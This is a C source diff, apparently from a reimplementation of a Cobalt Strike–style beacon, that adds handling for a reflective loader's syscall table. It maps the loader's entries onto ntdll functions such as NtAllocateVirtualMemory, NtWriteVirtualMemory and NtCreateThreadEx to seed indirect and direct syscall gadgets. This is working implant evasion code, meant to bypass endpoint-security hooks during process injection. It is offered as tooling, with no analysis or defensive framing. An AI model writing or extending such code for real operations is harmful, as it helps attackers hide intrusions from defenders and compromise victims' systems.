@@ -466,6 +466,91 @@ const char * syscalls_test_form(const char * name)
 	return "direct";
 }
 
+/* 4.9 Beacon User Data syscall override: a UDRL may deliver a
+ * SYSCALL_API table (entries: jump address for indirect syscalls, syscall
+ * number for direct, Nt* function address for fallback) through the
+ * reason-0x0d USER_DATA structure. When a table is present and the
+ * beacon's own resolver has not located a gadget for an entry, the UDRL
+ * value seeds it: gadget = jump address (ntdll syscall;ret shape),
+ * ssn = syscall number. The beacon-resolved values still win when both
+ * exist (our gadget discovery runs against the live ntdll). */
+typedef struct {
+	unsigned int jump_address;
+	unsigned int syscall_number;
+	void       * func_address;
+} UD_SYSCALL_ENTRY;
+
+typedef struct {
+	UD_SYSCALL_ENTRY * entries;
+	unsigned int       count;
+} UD_SYSCALL_TABLE;
+
+/* populated by ReflectiveDll.cpp's reason-13 handler (see
+ * BeaconSetUserDataSyscalls) - declared extern here so the types match */
+void syscalls_apply_udrl_table(const void * table);
+
+static void apply_udrl_entry(sc_entry * e, const UD_SYSCALL_ENTRY * u, const char * what)
+{
+	if (e == NULL || u == NULL || e->gadget != NULL)
+		return; /* beacon-resolved wins / nothing to seed */
+	if (u->jump_address != 0) {
+		/* the jump address points into the live ntdll (indirect-syscall
+		 * shape); the syscall;ret gadget is exactly there */
+		e->gadget = (BYTE *)(DWORD_PTR)u->jump_address;
+		e->ssn = u->syscall_number;
+		e->ready = TRUE;
+		e->arity = 4; /* conservative default arity until first use */
+	}
+	else if (u->syscall_number != 0 && u->func_address != NULL) {
+		/* direct-syscall shape: ssn known, gadget unknown - leave gadget
+		 * NULL so make_exec serves the direct form with the UDRL ssn */
+		e->ssn = u->syscall_number;
+	}
+	(void)what;
+}
+
+void syscalls_apply_udrl_table(const void * table)
+{
+	const UD_SYSCALL_TABLE * t = (const UD_SYSCALL_TABLE *)table;
+	unsigned int i;
+	if (t == NULL || t->entries == NULL)
+		return;
+	/* The official SYSCALL_API table carries no names; its layout is the
+	 * beacon_user_data.h enum order. We match each entry by its
+	 * func_address against the live ntdll export (the official table's
+	 * func_address field points at the Nt* function it describes) - that
+	 * makes the wiring name-correct regardless of enum ordering. */
+	{
+		HMODULE nt = GetModuleHandleA("ntdll.dll");
+		struct { const char * name; sc_entry * e; } map[] = {
+			{ "NtAllocateVirtualMemory",  &sc_alloc },
+			{ "NtWriteVirtualMemory",     &sc_write },
+			{ "NtReadVirtualMemory",      &sc_read },
+			{ "NtDuplicateObject",        &sc_dup },
+			{ "NtProtectVirtualMemory",   &sc_protect },
+			{ "NtFreeVirtualMemory",      &sc_free },
+			{ "NtMapViewOfSection",       &sc_mapview },
+			{ "NtUnmapViewOfSection",     &sc_unmap },
+			{ "NtOpenProcess",            &sc_openproc },
+			{ "NtCreateThreadEx",         &sc_thrdex },
+		};
+		unsigned int m, k;
+		for (m = 0; m < (sizeof(map) / sizeof(map[0])); m++) {
+			void * live = NULL;
+			if (nt != NULL)
+				live = (void *)GetProcAddress(nt, map[m].name);
+			for (k = 0; k < t->count && k < 64; k++) {
+				if (t->entries[k].func_address == NULL)
+					continue;
+				if (live != NULL && t->entries[k].func_address == live) {
+					apply_udrl_entry(map[m].e, &t->entries[k], map[m].name);
+					break;
+				}
+			}
+		}
+	}
+}
+
 int syscalls_gate_ready_count(void) {
 	int n = 0;
 #define SC_COUNT(id, name, ar) n += sc_##id.ready ? 1 : 0;
